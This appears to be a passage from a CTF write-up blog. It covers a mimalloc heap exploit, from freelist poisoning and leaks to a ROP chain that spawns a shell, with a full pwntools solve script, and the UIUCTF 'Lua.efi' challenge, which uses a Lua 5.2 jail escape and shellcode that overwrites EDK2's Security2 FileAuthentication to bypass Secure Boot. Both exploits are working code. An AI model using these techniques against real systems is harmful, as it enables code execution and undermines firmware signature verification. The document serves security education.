- After exhausting the `free` list, `local_free` fills up with freed chunks:
![img](/images/freelist2.png)

On the next allocation, `mimalloc` migrates the `local_free` chunks into the free list, making them available for reuse:
![img](/images/freelist3.png)

And this can be triggered like so:

```py
for i in range(19):
    create(0)
    delete(0)

create(15)
delete(15)

for i in range(10):
    create(0)
    delete(0)

create(1)
delete(1)
```

Now that all previously freed chunks have been migrated to the free list, we can begin manipulating the heap. Looking at the notes array:

![img](/images/notes.png)

We have three pointers that correspond to our allocated chunks. Let's use the chunk at index 0 to corrupt the freelist pointer.
```py
create(1)
edit(0, p64(0xdeadbeef))
```
After this, we can confirm that the freelist is indeed corrupted:

![img](/images/corruptedlist.png)

If we now attempt to allocate twice, the allocator will eventually follow our corrupted pointer and crash inside `mi_malloc`, as it attempts to access an invalid address:

![img](/images/crashmalloc.png)

With this primitive, we now have arbitrary control over the freelist pointer — allowing us to allocate memory at any address. This lets us place a chunk at the top of the mimalloc page, where important internal pointers (including ones into the libmimalloc library) are stored.

```py
create(1)
edit(0, p64(heap_base+0x190))
create(0)
create(1)
show(1)
libc_leak = u64d(rl()[48:48+8])
libc.address = libc_leak - 0x2b100
log.success("Libc leak: %#x", libc_leak)
log.success("Libc base: %#x", libc.address)
```
We successfully leaked the libmimalloc address and subtracted the appropriate offset to recover its base address.

However, there's now a problem: the freelist is corrupted, so further allocations will crash. Fortunately, we allocated a chunk at index 1 at address `heap_base + 0x190`, which points directly to the `free` member of the `mi_page_t` struct. This gives us a reliable write primitive to repair the freelist when needed.

```py
edit(1, p64(heap_base+0x10a80)) # Fix freelist
```

This allows us to continue performing arbitrary chunk allocations as before. After each corruption, we can simply use index 1 again to fix the freelist and maintain heap stability.

Even though libmimalloc is compiled with full protections (e.g., full RELRO, NX, PIE), it still contains a rich set of ROP gadgets. My plan was to construct a ROP chain. To locate the stack, I leaked the address of environ.

We can observe that environ is stored near Thread-Local Storage (TLS):

![img](/images/environ.png)

Conveniently, the mi_page_t struct includes a pointer to TLS. Using the same arbitrary allocation technique as before, we can place a chunk at environ, giving us the stack address.

From there, we can calculate the return address (RIP) at the end of the edit function.


```py
edit(1, p64(heap_base+0x10a80)) # Fix freelist
edit(15, p64(heap_base+0x118))
create(2)
create(2)
show(2)
tls_leak = u64d(rl()[:8])
tls_base = tls_leak - 0x1b28
environ = tls_base + 0x1d60
log.success("TLS leak: %#x", tls_leak)
log.success("TLS base: %#x", tls_base)
log.info("environ: %#x", environ)

edit(1, p64(heap_base+0x10a80)) # Fix freelist
edit(15, p64(environ))
create(2)
create(2)
show(2)
stack_leak = u64d(rl()[:8])
rip = stack_leak - 0x70
log.success("Stack leak: %#x", stack_leak)
```

There are a lot of gadgets in libmimalloc, but I couldn't find a syscall instruction within the library itself. However, the dynamic linker contains a syscall function that includes the syscall instruction. Fortunately, we can leak the address of the linker through the GOT in libmimalloc, which allows us to locate the syscall gadget.

![img](/images/syscallgot.png)
![img](/images/syscall.png)

```py
edit(1, p64(heap_base+0x10a80)) # Fix freelist
edit(15, p64(libc.address + 0x29c50)) # syscall got. Syscall points to ld
create(2)
create(2)
show(2)
syscall_got = u64d(rl()[:8])
ld_base = syscall_got - 0x55f1f
log.success("ld leak: %#x", syscall_got)
log.success("ld base: %#x", ld_base)
```

What we can do now is simply allocate a chunk at the RIP address and overwrite it with our ROP chain. I crafted a ROP chain that performs an execve syscall. Since the challenge used BusyBox, I had to invoke it like this:

```c
execve("/bin/sh", {"sh", NULL}, 0)
```

I placed the `/bin/sh` string in the first chunk I allocated. Later, I edited another chunk to create the argv array for the execve syscall: the first QWORD points to the `/bin/sh` string, and the second QWORD is set to 0. This is necessary because if the second **QWORD (i.e., argv[1]) isn’t NULL**, the shell won’t spawn properly. Additionally, since pwntools automatically sends a newline character with `sendline()`, it’s important to account for that when constructing your payload.

The final solve script:

```py
from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw, ssl=False)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
'''.format(**locals())

exe = './chal'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'
libc = ELF("./libmimalloc.so.2.2", checksec=False)

sla = lambda delim, data: io.sendlineafter(delim, data)
sa = lambda delim, data: io.sendafter(delim, data)
sl = lambda data: io.sendline(data)
s = lambda data: io.send(data)
ru = lambda delim: io.recvuntil(delim)
rl = lambda: io.recvline()
r = lambda num=4096: io.recv(num)

def u32d(data): return u32(data.ljust(4, b'\x00'))
def u64d(data): return u64(data.ljust(8, b'\x00'))

io = start()

def create(position):
    sla(b'> ', b'1')
    sla(b': ', str(position))

def delete(position):
    sla(b'> ', b'2')
    sla(b': ', str(position))

def show(position):
    sla(b'> ', b'3')
    sla(b': ', str(position))

def edit(position, content):
    sla(b'> ', b'4')
    sla(b': ', str(position))
    sla(b': ', content)
    
create(0)
edit(0, b'A' * 8 + b'/bin/sh\x00')
delete(0)
delete(0)
show(0)
leak = u64d(ru(b'/bin/sh\x00')[:-8])
heap_base = leak - 0x10080
log.success("Heap leak: %#x", leak)
log.success("Heap base: %#x", heap_base)

for i in range(19):
    create(0)
    delete(0)

create(15)
delete(15)

for i in range(10):
    create(0)
    delete(0)

create(1)
delete(1)

create(1)
edit(0, p64(heap_base+0x190))
create(0)
create(1)
show(1)
libc_leak = u64d(rl()[48:48+8])
libc.address = libc_leak - 0x2b100
log.success("Libc leak: %#x", libc_leak)
log.success("Libc base: %#x", libc.address)

edit(1, p64(heap_base+0x10a80)) # Fix freelist
edit(15, p64(heap_base+0x118))
create(2)
create(2)
show(2)
tls_leak = u64d(rl()[:8])
tls_base = tls_leak - 0x1b28
environ = tls_base + 0x1d60
log.success("TLS leak: %#x", tls_leak)
log.success("TLS base: %#x", tls_base)
log.info("environ: %#x", environ)

edit(1, p64(heap_base+0x10a80)) # Fix freelist
edit(15, p64(environ))
create(2)
create(2)
show(2)
stack_leak = u64d(rl()[:8])
rip = stack_leak - 0x70
log.success("Stack leak: %#x", stack_leak)

edit(1, p64(heap_base+0x10a80)) # Fix freelist
edit(15, p64(libc.address + 0x29c50)) # syscall got. Syscall points to ld
create(2)
create(2)
show(2)
syscall_got = u64d(rl()[:8])
ld_base = syscall_got - 0x55f1f
log.success("ld leak: %#x", syscall_got)
log.success("ld base: %#x", ld_base)

edit(1, p64(heap_base+0x10a80)) # Fix freelist
edit(15, p64(rip))
create(2)
create(2)

poprdi = libc.address + 0x8555 # pop rdi; ret;
poprsi = libc.address + 0x7764 # pop rsi; ret;
poprax = libc.address + 0x6001 # pop rax; ret;
xorrdx = libc.address + 0x185be # xor edx, edx; mov rax, rdx; ret;
syscall = ld_base + 0x4370f # syscall; ret;

edit(0, b'A' * 8 + p64(leak+8+5) + p64(0x0))

payload = flat(
    poprdi,
    heap_base+0x10088, # /bin/sh 
    poprsi,
    heap_base+0x10f88, # sh 
    xorrdx,
    poprax,
    0x3b,
    syscall
)

edit(2, payload)

io.interactive()
```

# Lua.efi

|||
|-|-|
|  **CTF**  |  [UIUCTF](https://2025.uiuc.tf/) [(CTFtime)](https://ctftime.org/event/2640)  |
|  **Author** |  YiFei Zhu |
|  **Category** |  Pwn |
|  **Solves** |  12  |

![img](/images/luaefi.png)

## Challenge Analysis

We can download the handout and see that it contains several files:

![img](/images/luahandout.png)

In the `README` file, we can find a description of each directory. The `edk2_artifacts` directory contains all the artifacts with debug symbols. The `chal_build` directory isn't particularly important, except for a few files. The `run` directory holds all the necessary files to run the challenge.

The `run.sh` script contains:

```sh
#! /bin/sh

cp OVMF_VARS.fd OVMF_VARS_copy.fd

# Note: rootfs is read-only on remote
rm -rf rootfs_copy; cp -r rootfs rootfs_copy

qemu-system-x86_64 \
  -no-reboot \
  -machine q35,smm=on \
  -cpu max \
  -m 256 \
  -net none \
  -serial stdio \
  -display none \
  -monitor none \
  -vga none \
  -global ICH9-LPC.disable_s3=1 \
  -global driver=cfi.pflash01,property=secure,value=on \
  -fw_cfg name=opt/org.tianocore/FirmwareSetupSupport,string=no \
  -fw_cfg name=opt/org.tianocore/EFIShellSupport,string=no \
  -fw_cfg name=opt/org.tianocore/EnableLegacyLoader,string=no \
  -drive if=pflash,format=raw,unit=0,file=OVMF_CODE.fd,readonly=on \
  -drive if=pflash,format=raw,unit=1,file=OVMF_VARS_copy.fd \
  -drive format=raw,file=fat:rw:rootfs_copy \
  -virtfs local,multidevs=remap,path=secret,security_model=none,mount_tag=flag,readonly=on
```

The `init` file contains the following:

```sh
#!/bin/sh
# Copyright 2021-2025 Google LLC.
# SPDX-License-Identifier: MIT

export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

set -x

mkdir -p /proc /dev /sys /etc /mnt

mount -n -t proc -o nosuid,noexec,nodev proc /proc/
mount -n -t devtmpfs -o mode=0755,nosuid,noexec devtmpfs /dev
mount -n -t sysfs -o nosuid,noexec,nodev sys /sys
mount -n -t tmpfs -o mode=1777 tmpfs /tmp

mount -n -t 9p flag -o nosuid,noexec,nodev,version=9p2000.L,trans=virtio,msize=104857600 /mnt
cat /mnt/flag

sleep 10
poweroff -f
```

It mounts the flag and prints it during boot. The challenge description mentions booting a backdoored kernel, so the goal is to boot that kernel—which should print the flag.

When we run the challenge, we see the following menu:
![img](/images/menu.png)

However, when we try to boot the Linux container, we get this error:

![img](/images/backdoorboot.png)

This indicates that the kernel we want to boot is blocked by Secure Boot.

A few patches have been applied. The patches inside the `edk2` directory add ASLR support, since UEFI doesn’t have ASLR by default. There’s also a Lua interpreter included, but the internal functions to open, read, write files, and execute commands have been removed—most likely to prevent unintended solutions.

From the start of the CTF, we received a hint for this challenge:

> Feel free to use known exploits that exist in the wild to escape the lua "jail", such as https://gist.github.com/corsix/49d770c7085e4b75f32939c6c076aad6

This exploit targets the Lua 5.2 interpreter, which we can use to escape the Lua jail. 

## Setup

For this challenge, I modified the run script to include the `-s` option so that I could connect with GDB. I also added two lines to dump logs during system boot:

```sh
  -debugcon file:edk2debug.log \
  -global isa-debugcon.iobase=0x402 \
```

Inside the log, we can find the entry points and base addresses of the different EFI modules. For example:

```
FSOpen: Open '\Lua.efi' Success
[Security] 3rd party image[0] can be loaded after EndOfDxe: PciRoot(0x0)/Pci(0x1F,0x2)/Sata(0x0,0xFFFF,0x0)/HD(1,MBR,0xBE1AFDFA,0x3F,0xFBFC1)/\Lua.efi.
DxeImageVerification: MeasureVariable (Pcr - 7, EventType - 800000E0, VariableName - db, VendorGuid - D719B2CB-3D3A-4596-A3BC-DAD00E67656F)
MeasureBootPolicyVariable - Not Found
None of Tcg2Protocol/CcMeasurementProtocol is installed.
InstallProtocolInterface: 5B1B31A1-9562-11D2-8E3F-00A0C969723B D12B240
Loading driver at 0x0000D082000 EntryPoint=0x0000D084165 Lua.efi
InstallProtocolInterface: BC62157E-3E33-4FEC-9920-2D3B36D750DF D12EB18
ProtectUefiImageCommon - 0xD12B240
  - 0x000000000D082000 - 0x0000000000044C00
DXE StartImage - 0x0000D084165
```

We can then create a GDB script and use it to relocate the EFI module using the debug file:

```
target remote :1234
add-symbol-file ../edk2_artifacts/Lua.debug -o 0x0000D082000
c
```

## Exploitation

This was my first UEFI challenge, so I spent a lot of time reading EDK2 code. The goal was to disable Secure Boot. Initially, I tried doing everything from Lua, including creating arbitrary read/write functions. At some point, I started thinking about executing shellcode. I used the exploit provided in the hint, but had to remove a few local keywords to avoid errors.

I created a string and printed its address. When checking the memory permissions, I noticed that it lived in an RWX page—meaning I could place shellcode there and execute it using the Lua exploit. The Lua jail escape gave me both an addrof primitive and an arbitrary function call to any address.

```lua
as_num = string.dump(function(...) for n = ..., ..., 0 do return n end end)
as_num = as_num:gsub("\x21", "\x17", 1)
as_num = assert(load(as_num))

function addr_of(x) return as_num(x) * 2^1000 * 2^74 end

function ub8(n)
  local t = {}
  for i = 1, 8 do
    local b = n % 256
    t[i] = string.char(b)
    n = (n - b) / 256
  end
  return table.concat(t)
end

upval_assign = string.dump(function(...)
  local magic
  (function(func, x)
    (function(func)
      magic = func
    end)(func)
    magic = x
  end)(...)
end)
upval_assign = upval_assign:gsub("(magic\x00\x01\x00\x00\x00\x01)\x00", "%1\x01", 1)
upval_assign = assert(load(upval_assign))

function make_CClosure(f, up)
  local co = coroutine.wrap(function()end)

  local offsetof_CClosure_f = 24
  local offsetof_CClosure_upvalue0 = 32
  local sizeof_TString = 24
  local offsetof_UpVal_v = 16
  local offsetof_Proto_k = 16
  local offsetof_LClosure_proto = 24
  local upval1 = ub8(addr_of(co) + offsetof_CClosure_f)
  local func1 = ub8(addr_of("\x00\x00\x00\x00\x00\x00\x00\x00") - offsetof_Proto_k) .. ub8(addr_of(upval1) + sizeof_TString - offsetof_UpVal_v)
  local upval2 = ub8(addr_of(co) + offsetof_CClosure_upvalue0)
  local func2 = func1:sub(1, 8) .. ub8(addr_of(upval2) + sizeof_TString - offsetof_UpVal_v)
  upval_assign((addr_of(func1) + sizeof_TString - offsetof_LClosure_proto) * 2^-1000 * 2^-74, f * 2^-1000 * 2^-74)
  upval_assign((addr_of(func2) + sizeof_TString - offsetof_LClosure_proto) * 2^-1000 * 2^-74, up)
  
  return co
end

a = "AAAAAAAA"
addr = addr_of(a)
print(string.format("0x%X", addr))
```

![img](/images/addrof.png)
![img](/images/rwx.png)

If we check whether the data is at that location, we can see that it is located 0x18 bytes after the leaked address.

![img](/images/luastring.png)

We can now execute it by calling the closure function on the leaked address.

```lua
r = make_CClosure(addr, 0)
r()
```

Now, how do we disable Secure Boot? Since we have arbitrary code execution and can manipulate memory freely, there are several ways to do this. When an image is loaded using [`LoadImage`](https://uefi.org/specs/UEFI/2.9_A/07_Services_Boot_Services.html#efi-boot-services-loadimage), it internally calls the [`FileAuthentication`](https://github.com/tianocore/edk2/blob/master/MdeModulePkg/Core/Dxe/Image/Image.c#L1271) function from the Security2 protocol. The `_EFI_SECURITY2_ARCH_PROTOCOL` structure is defined as [this](https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Protocol/Security2.h#L95C8-L95C36)

```c
///
/// The EFI_SECURITY2_ARCH_PROTOCOL is used to abstract platform-specific policy from the
/// DXE Foundation. This includes measuring the PE/COFF image prior to invoking, comparing the
/// image against a policy (whether a white-list/black-list of public image verification keys
/// or registered hashes).
///
struct _EFI_SECURITY2_ARCH_PROTOCOL {
  EFI_SECURITY2_FILE_AUTHENTICATION    FileAuthentication;
};
```

Every UEFI protocol has a globally unique identifier called a GUID. There is also a function named `LocateProtocol`, defined as [`EFI_BOOT_SERVICES.LocateProtocol()`](https://uefi.org/specs/UEFI/2.9_A/07_Services_Boot_Services.html#efi-boot-services-locateprotocol). 

The `LocateProtocol()` function searches for the first device handle that supports a given protocol and returns a pointer to the protocol interface in the Interface parameter. If no instance of the protocol is found, Interface is set to NULL.

We can use this function to locate the Security2 protocol. To do this, we need to provide the GUID of the Security2 protocol and a pointer to the Interface variable. The Registration parameter is optional and can be NULL. LocateProtocol is part of the [Boot Services](https://uefi.org/specs/UEFI/2.9_A/04_EFI_System_Table.html#efi-boot-services-table), which are accessed through the EFI Boot Services Table. This table contains a header and pointers to all boot services functions.

Looking at how it’s used in the edk2 [source compiled](https://github.com/tianocore/edk2/blob/master/ArmPkg/Drivers/ArmCrashDumpDxe/ArmCrashDumpDxe.c#L26), we see a global variable `gBS` representing the Boot Services Table is used to call LocateProtocol.

```c
Status = gBS->LocateProtocol (&gEfiCpuArchProtocolGuid, NULL, (VOID **)&mCpu);
```

We can verify if the gBS pointer is accessible to us. By setting a breakpoint at the start of the shellcode and using debug symbols, we can inspect the memory near our stack pointer (RSP) to locate gBS.

![img](/images/gBS.png)

As we can see, gBS resides in memory at a fixed offset from RSP. This offset remains mostly constant across runs, which means we can reliably use it to retrieve the gBS pointer during exploitation.

At offset 0x140 within the gBS structure, we find the pointer to the LocateProtocol function.

In our shellcode, we need to call LocateProtocol with two arguments:
- The GUID of the Security2 protocol (which we can get from the edk2 source).
- A pointer to a valid memory location where the protocol interface pointer will be stored (so we can read and modify it).

Our goal is to overwrite the FileAuthentication member of the Security2 protocol interface with a stub function that simply XORs RAX with itself and returns. This effectively disables Secure Boot’s signature verification.

Here’s the final shellcode I used to perform this:

```nasm
bits 64
default rel

start:
        mov     r11, rsp
        add     r11, 0x25f48 ; Pointer to BootService (gBS) 0x25ec0

        lea     rcx, [rel SECURITY2_GUID]
        xor     rdx, rdx                     
        lea     r8,  [rel iface_slot]       

        mov     rax, [r11 + 0x140] ; gBS->LocateProtocol
        call    rax

        cmp     eax, 0
        jne     .fail

        mov     r12, [rel iface_slot]
        lea     r13, [rel .fail]
        mov     [r12], r13
    
        ret

.fail:
        xor rax, rax
        ret

SECURITY2_GUID:
        dd 0x94ab2f58
        dw 0x1438
        dw 0x4ef1
        db 0x91,0x52,0x18,0x94,0x1a,0x3a,0x0e,0x68

iface_slot:     dq 0
```

> The calling convention here differs from the standard Linux x86-64 ABI. The arguments for the function are passed in RCX, RDX, and R8 instead of RDI, RSI, and RDX.

When we run the shellcode, we can confirm that the FileAuthentication member of the Security2 protocol is successfully overwritten.

After calling LocateProtocol, the pointer to the protocol interface is stored at the location of the interface pointer (referred to as iface_slot):

![img](/images/locateprotocol.png)

Just before the final `mov` instruction, we observe the code preparing to overwrite the protocol’s function pointer with our stub `.fail`:

![img](/images/beforemov.png)

After executing the `mov`, the instruction pointer at that location points to our stub function, effectively disabling Secure Boot:

![img](/images/aftermov.png)

From here, we can simply return normally (ret), and the Lua interpreter resumes safely. Inside the interpreter, running `os.exit()` returns us to the menu.

At the menu, we can now start the Linux kernel without Secure Boot blocking us and finally read the flag:

![img](/images/flag.png)
